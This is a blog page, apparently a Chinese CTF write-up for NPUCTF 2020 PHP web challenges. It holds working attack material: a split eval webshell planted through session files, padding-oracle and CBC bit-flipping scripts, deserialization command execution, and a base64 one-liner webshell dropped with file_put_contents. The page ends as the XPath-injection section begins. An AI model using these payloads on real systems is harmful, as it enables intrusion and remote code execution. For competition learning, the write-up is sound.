@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="NPUCTF-wp"/>
+
+
+
+
+  <meta name="keywords" content="wp," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/04/20/NPUCTF-wp/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="NPUCTF-wp">
+<meta property="og:url" content="https://glotozz.github.io/2020/04/20/NPUCTF-wp/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/04/20/kJztYlVnDCGyqEm.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/21/iD3qNK5wjGVHvut.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/21/T1yfxrSaEVK67bY.png">
+<meta property="article:published_time" content="2020-04-20T10:25:55.000Z">
+<meta property="article:modified_time" content="2020-04-21T10:06:33.599Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/04/20/kJztYlVnDCGyqEm.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> NPUCTF-wp - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          NPUCTF-wp
+        
+      </h1>
+
+      <time class="post-time">
+          Apr 20 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#超简单的php超简单">超简单的PHP！！！超简单！！！</a><ul>
+<li><a href="#web">web🐕</a></li>
+<li><a href="#realezphp">RealEzPHP</a></li>
+<li><a href="#ezlogin">ezlogin</a></li>
+<li><a href="#ezinclude">ezinclude</a></li>
+<li><a href="#验证">验证🐎</a></li>
+<li><a href="#ezshiro">ezShiro</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h4><span id="超简单的php超简单">超简单的PHP！！！超简单！！！</span></h4><p>文件包含读源码，主要是下面两个</p>
+<p><code>/phpinfo.php</code></p>
+<p><code>/msg.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'content-type:application/json'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strlen($msg)&gt;<span class="number">17</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"msg is too loooong!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">"/php/"</span>,<span class="string">"?"</span>,$msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'msg'</span>])&amp;<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))$_SESSION[<span class="string">'msg'</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    array_push($_SESSION[<span class="string">'msg'</span>], [<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>([<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode($_SESSION[<span class="string">'msg'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">"è¿ä¸å¿«å»çè¨ï¼"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将用户传入的msg写入session文件，给了<code>phpinfo()</code>可知session路径，配合文件包含getshell。</p>
+<p>考点是限制了单次写入的<code>msg</code>要17字符以内，看比赛文档的时候看到了思路哈哈哈</p>
+<p>1、利用反引号，但是这里<code>disable_func</code>中禁用了<code>shell_exec()</code>，无法使用。</p>
+<p>2、利用短标签，这里也关闭了。</p>
+<p>3、因为一次写入无法构造，可以利用注释符多次写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP  &#x2F;*</span><br><span class="line">*&#x2F;eval&#x2F;*</span><br><span class="line">*&#x2F;($_GET[a]);#</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直观一点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg|a:4:&#123;i:0;a:2:&#123;s:3:&quot;msg&quot;;s:9:&quot;&lt;?PHP  &#x2F;*&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:34:56&quot;;&#125;i:1;a:2:&#123;s:3:&quot;msg&quot;;s:8:&quot;*&#x2F;eval&#x2F;*&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:34:58&quot;;&#125;i:2;a:2:&#123;s:3:&quot;msg&quot;;s:14:&quot;*&#x2F;($_GET[a]);#&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:35:09&quot;;&#125;i:3;a:2:&#123;s:3:&quot;msg&quot;;s:2:&quot;?&gt;&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:35:17&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/04/20/kJztYlVnDCGyqEm.png" alt="Snipaste_2020-04-20_19-37-12.png"></p>
+<p>最后bypass可以利用<code>error_log()</code>触发<code>ld_preload</code></p>
+<h3><span id="web">web🐕</span></h3><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>传method=encrypt可以得到<code>IV</code>和<code>$flag</code>加密后的密文，</p>
+<p>传method=decrypt可以对传入的<code>IV</code>和<code>data</code>进行解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">唯密文攻击：只知道密文</span><br><span class="line">已知明文攻击：得到了一些特定的明文与对应的密文</span><br><span class="line">选择明文攻击：攻击者可以任意选择一些明文，并得到对应的密文</span><br><span class="line">选择密文攻击：攻击者可以任意的制造或者选择一些密文，并得到对应的明文</span><br><span class="line">选择文本攻击：攻击者可以制造任意的明文&#x2F;密文，并得到对应的密文&#x2F;明文，也就是选择明文攻击+选择密文攻击</span><br></pre></td></tr></table></figure>
+
+<p>这题符合CBC选择密文攻击，但是一般用来得到<code>IV</code>的，但是这里给了<code>IV</code></p>
+<p>并且理论上可以直接将给我们的密文解密，返回了一个<code>1</code>，是因为增加了<code>openssl_decrypt() or die(&#39;False&#39;)</code>，导致正常解密会返回<code>1</code>，有想着本地测试把这个删除，但是由于key未知，无法成功解密</p>
+<p>没啥别的想法，搜<code>openssl_decrypt()</code>的bug也没收获，遂作罢</p>
+<p>==========================重新看一下</p>
+<p>CBC模式的加密方式是通过一个初始向量（<code>IV</code>）先和明文分组第一组异或后使用秘钥K加密，作为第一组密文，同时又与后一分组的明文异或后进行加密产生下一组密文，依次重复。其解密和加密是对称的，密文先解密，再异或。</p>
+<p><strong>Padding Oracle Attack</strong></p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/p00mj/p/11797786.html" target="_blank" rel="noopener">https://www.cnblogs.com/p00mj/p/11797786.html</a> </p>
+</blockquote>
+<p>条件：已知<code>IV</code>和密文，可以利用服务端解密</p>
+<p>结果：获取密文对应的明文(如果分组大于1组，没有<code>IV</code>的情况这里可以获取到部分明文) </p>
+<p>和题目给的条件完全符合。</p>
+<p>分组加密中数据填充常用的方式（<code>PKCS#5</code>）</p>
+<p>核心思想（比如求最后一位）</p>
+<p><img src="https://i.loli.net/2020/04/21/iD3qNK5wjGVHvut.png" alt="Snipaste_2020-04-21_16-24-40.png"></p>
+<p>穷举<code>IV</code>，当正常解密时（<code>0x3C</code>）即可利用明文<code>0x01 xor 0x3C</code>得到中间值为<code>0X3D</code>，而原始<code>IV</code>为<code>0X39</code>，</p>
+<p><code>明文 = 中间值 xor IV</code>，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x01 &#x3D; 中间值 xor 0x3c</span><br><span class="line">待求明文 &#x3D; 中间值 xor 0x39</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">待求明文 &#x3D; 0x01 xor 0x3c xor 0x39</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://ha1cyon-ctf.fun:30141/index.php?source&amp;method=decrypt'</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">l = [<span class="number">0</span>] * N</span><br><span class="line">iv = <span class="string">'6666666666666666'</span></span><br><span class="line">tmp_iv = <span class="string">''</span></span><br><span class="line">out = [<span class="number">0</span>] * N</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        l[N-i] = c</span><br><span class="line">        tmp_iv = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> l:</span><br><span class="line">            tmp_iv += chr(m)</span><br><span class="line">        <span class="keyword">print</span> base64.b64encode(tmp_iv)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'iv'</span>: tmp_iv,</span><br><span class="line">            <span class="string">'data'</span>: <span class="string">'ly7auKVQCZWum/W/4osuPA=='</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        data = requests.post(url, data=data).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'False'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            out[N-i] = c ^ i</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(i):</span><br><span class="line">                l[N-y<span class="number">-1</span>] = out[N-y<span class="number">-1</span>] ^ (i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">    out[i] = out[i] ^ ord(iv[i])</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> out:</span><br><span class="line">    s += chr(c)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>
+
+<p>第二关源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);    <span class="comment">//$fl4g</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"6666666"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span><span class="params">()</span></span>&#123;    <span class="comment">//生成随机初始向量IV</span></span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala = <span class="string">'piapiapiapia'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'Identity'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'iv'</span>] = get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'Identity'</span>] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[<span class="string">'iv'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($_SESSION[<span class="string">'iv'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    $tmp_id = openssl_decrypt(base64_decode($_SESSION[<span class="string">'Identity'</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[<span class="string">'iv'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $tmp_id.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($tmp_id ===<span class="string">'weber'</span>)<span class="keyword">die</span>($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>cbc字节翻转攻击</strong></p>
+<p>以前接触的一般是已知<code>IV</code>，一组明文和密文，伪造密文得到想要的明文。</p>
+<p>但是由于这里加密的明文较短（16位以内），并且可以伪造<code>IV</code>，也可以进行CBC字节翻转</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">source_str = <span class="string">'piapiapiapia'</span> + <span class="number">4</span> * <span class="string">'\x04'</span></span><br><span class="line">target_srt = <span class="string">'weber'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></span><br><span class="line">token = <span class="string">'OLpN/moDgNn8qcFMBcJ0Ew=='</span>  <span class="comment"># 你获得的初始IV的base64encode值</span></span><br><span class="line">token = str(base64.b64decode(token), <span class="string">"ISO-8859-1"</span>)	<span class="comment"># 这里的字节超出utf-8的范围,因此使用ISO-8859-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(target_srt)):</span><br><span class="line">    token += chr(ord(token[i]) ^ ord(target_srt[i]) ^ ord(source_str[i]))</span><br><span class="line">print(base64.b64encode(token.encode()))</span><br></pre></td></tr></table></figure>
+
+<p>刚想打好像环境没了。。</p>
+<h3><span id="realezphp">RealEzPHP</span></h3><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-20</span> <span class="number">12</span>:<span class="number">59</span>:<span class="number">59</span></span><br></pre></td></tr></table></figure>
+
+<p>利用<code>assert()</code>命令执行，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">PHP Version 7.0.33</span><br><span class="line">disable_function</span><br><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir</span><br></pre></td></tr></table></figure>
+
+<p>下一步</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(&#39;&#x2F;&#39;))</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">string(10) &quot;FIag_!S_it&quot;</span><br><span class="line"></span><br><span class="line">禁用了readfile,尝试file_get_contents()</span><br><span class="line">var_dump(base64_encode(file_get_contents(\&#39;&#x2F;FIag_!S_it\&#39;)))</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">string(64) &quot;TlBVQ1RGe3RoaXNfaXNfbm90X2FfZmFrZV9mbGFnX2J1dF90cnVlX2ZsYWd9Cg&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可惜flag是错的，想办法连蚁剑，通过下面的方式写入一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&#39;1.php&#39;, base64_decode(&#39;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;&#39;))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>一开始自己的测试环境是<code>php7.1.9</code>，但是发现在<code>php7.1.9</code>中无法正常写入，提示<code>Cannot call assert() with string argument dynamically</code>，切换成<code>php7.0.9</code>成功写入。网上解释的也不清楚，最好的办法还是切成和题目相同的环境</p>
+</blockquote>
+<p>最后可以通过<code>error_log()</code>bypass，非预期解是<code>phpinfo()</code>中的环境变量</p>
+<hr>
+<h3><span id="ezlogin">ezlogin</span></h3><p>hint：请自行了解XPath盲注，路径表达式可用于选取XML文档中的节点或者节点集</p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">xpath注入详解</a></p>
+<p><a href="https://www.tr0y.wang/2019/05/11/XPath注入指北/" target="_blank" rel="noopener">xpath注入指北</a></p>
+</blockquote>
+<p>demo</p>
